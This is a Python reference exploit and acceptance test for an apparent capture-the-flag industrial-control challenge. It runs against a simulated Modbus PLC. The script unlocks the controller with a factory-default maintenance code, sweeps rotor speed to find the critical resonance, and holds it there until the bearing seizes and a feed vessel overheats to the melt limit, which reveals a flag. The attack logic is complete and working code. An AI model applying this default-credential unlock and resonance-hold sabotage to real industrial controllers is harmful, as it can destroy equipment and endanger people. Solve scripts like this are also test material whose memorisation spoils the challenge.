#!/usr/bin/env python3
"""
Last Mile — reference exploit / acceptance test.

1. Unlock the controller with the factory-default maintenance code from the commissioning sheet
   (Lateral Drift's engineering workstation, Documents panel).
2. Sweep the rotor speed and watch the vibration register to find the critical speed.
3. Hold the rotor at the critical speed, tracking it as it drifts upward while the bearing heats, until
   the bearing wears out and seizes.
4. The rotor stops, the feed vessel loses its draw-off and heats; wait for the melt limit. The status
   page (/api/state) then shows the flag. The flag is never in a Modbus register.

Usage:
    python solve.py [--host 127.0.0.1] [--port 5020] [--status-port 8010] [--timeout 180]
                    [--unlock-code 4087] [--skip-unlock]   (--skip-unlock proves the lock holds)
"""

import argparse
import json
import sys
import time
import urllib.request

from pymodbus.client import ModbusTcpClient

HR_SETPOINT = 0
HR_SAFE_LIMIT = 1
HR_CURRENT_SPEED = 2
HR_MAINT_UNLOCK = 3
HR_VIBRATION = 5      # mm/s x10
HR_BEARING_TEMP = 6
HR_BEARING_WEAR = 7
HR_CORE_TEMP = 8
COIL_TRIPPED = 0
COIL_UNLOCKED = 1

DEFAULT_UNLOCK_CODE = 4087  # printed on the commissioning sheet on the engineering workstation


class Plc:
    def __init__(self, host, port, unit):
        self.c = ModbusTcpClient(host, port=port)
        self.unit = unit
        if not self.c.connect():
            print("[-] Connection refused. Is the sim running? docker compose up -d")
            sys.exit(1)

    def read(self):
        hr = self.c.read_holding_registers(HR_SETPOINT, count=9, slave=self.unit)
        co = self.c.read_coils(COIL_TRIPPED, count=2, slave=self.unit)
        if hr.isError() or co.isError():
            raise IOError(f"read failed: hr={hr} co={co}")
        r = hr.registers
        return {"setpoint": r[0], "safe_limit": r[1], "speed": r[2], "vib": r[5] / 10.0,
                "bearing": r[6], "wear": r[7], "core": r[8],
                "tripped": bool(co.bits[0]), "unlocked": bool(co.bits[1])}

    def write(self, addr, value):
        return self.c.write_register(addr, value, slave=self.unit)

    def goto(self, target, timeout=15):
        """Set the speed setpoint and wait for the rotor to get there."""
        self.write(HR_SETPOINT, int(target))
        end = time.time() + timeout
        while time.time() < end:
            if abs(self.read()["speed"] - target) < 1:
                return
            time.sleep(0.15)

    def vib_at(self, target, settle=0.45, samples=3):
        self.goto(target)
        time.sleep(settle)
        vals = []
        for _ in range(samples):
            vals.append(self.read()["vib"])
            time.sleep(0.1)
        return sum(vals) / len(vals)


def fetch_state(host, status_port):
    url = f"http://{host}:{status_port}/api/state"
    with urllib.request.urlopen(url, timeout=5) as r:
        return json.loads(r.read().decode())


def main() -> None:
    p = argparse.ArgumentParser(description="Last Mile — reference exploit")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=5020)
    p.add_argument("--status-port", type=int, default=8010)  # 8000 at the real event; 8010 locally
    p.add_argument("--unit", type=int, default=1)
    p.add_argument("--timeout", type=int, default=180)
    p.add_argument("--unlock-code", type=int, default=DEFAULT_UNLOCK_CODE)
    p.add_argument("--skip-unlock", action="store_true", help="GM check: setpoint writes must be ignored while locked")
    args = p.parse_args()

    print(f"[*] Connecting to {args.host}:{args.port} unit={args.unit} ...")
    plc = Plc(args.host, args.port, args.unit)
    s = plc.read()
    print(f"[+] Connected. speed={s['speed']}% vib={s['vib']} mm/s bearing={s['bearing']}C "
          f"wear={s['wear']}% feed_vessel={s['core']}C tripped={s['tripped']}\n")
    if s["tripped"]:
        print("[!] Already tripped: restart the sim container and try again.")
        sys.exit(1)

    if args.skip_unlock:
        print("[*] --skip-unlock: trying the setpoint while the controller is still locked ...")
        plc.write(HR_SETPOINT, 70)
        time.sleep(2)
        s = plc.read()
        ok = s["setpoint"] != 70 and s["speed"] < 50
        print(f"[{'+' if ok else '-'}] setpoint reads {s['setpoint']}, speed {s['speed']} -> lock {'HELD' if ok else 'FAILED'}")
        sys.exit(0 if ok else 1)

    print(f"[*] Writing maintenance unlock code {args.unlock_code} -> HR{HR_MAINT_UNLOCK} (40004) ...")
    plc.write(HR_MAINT_UNLOCK, args.unlock_code)
    if not plc.read()["unlocked"]:
        print("[-] Controller did not unlock (wrong code, or locked out for 60 s after 5 wrong codes).")
        sys.exit(1)
    print("[+] Unlocked (coil 00002 = 1).\n")

    safe = s["safe_limit"]
    print(f"[*] Sweeping speed 50..{safe} % and reading the vibration register ...")
    best_speed, best_vib = None, -1.0
    for speed in range(50, safe + 1, 2):
        v = plc.vib_at(speed)
        print(f"    speed {speed:3d} %   vibration {v:5.2f} mm/s")
        if v > best_vib:
            best_speed, best_vib = speed, v
    print(f"[+] Critical speed near {best_speed} % (vibration {best_vib:.1f} mm/s).\n")

    print("[*] Holding the rotor at the critical speed and tracking it as it drifts ...")
    target = best_speed
    deadline = time.time() + args.timeout
    while time.time() < deadline:
        s = plc.read()
        if s["tripped"]:
            break
        # Probe one step either side and move toward the louder one.
        candidates = {}
        for t in (target - 1, target, target + 1):
            if 45 <= t <= safe:
                candidates[t] = plc.vib_at(t, settle=0.3, samples=2)
        target = max(candidates, key=candidates.get)
        plc.goto(target)
        s = plc.read()
        print(f"    hold {target:3d} %   vib {s['vib']:5.2f}   bearing {s['bearing']:3d} C   wear {s['wear']:3d} %")
    else:
        print("[-] Timed out before the bearing failed.")
        sys.exit(1)

    print("\n[+] Rotor bearing seized and the cascade scram latched. Waiting for the feed vessel to reach the melt limit ...")
    while time.time() < deadline:
        state = fetch_state(args.host, args.status_port)
        print(f"    phase {state['phase']:<13} feed vessel {state['core']:7.1f} C")
        if "flag" in state:
            print(f"[+] {state['flag']}")
            return
        time.sleep(2)
    print("[-] The feed vessel did not reach the melt limit in time: check the status page manually.")
    sys.exit(1)


if __name__ == "__main__":
    main()
